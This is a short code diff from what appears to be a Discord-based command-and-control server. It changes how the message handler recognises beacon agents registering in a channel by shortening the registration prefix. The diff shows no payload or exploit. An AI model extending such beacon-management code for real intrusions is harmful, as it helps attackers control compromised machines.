@@ -126,8 +126,8 @@ async def on_message(message):
     This function checks for new agents (beacons) registering and processes tasks/responses.
     """
     if message.channel.id == CHANNEL_ID:
-        if message.content.startswith("[+] Registering new agent AGENT:"):
-            beaconId = message.content.split("[+] Registering new agent AGENT:")[1]
+        if message.content.startswith("AGENT:"):
+            beaconId = message.content.split("AGENT:")[1]
             print(f"New agent registered: {beaconId}")
 
                 # Start a new task loop for this agent
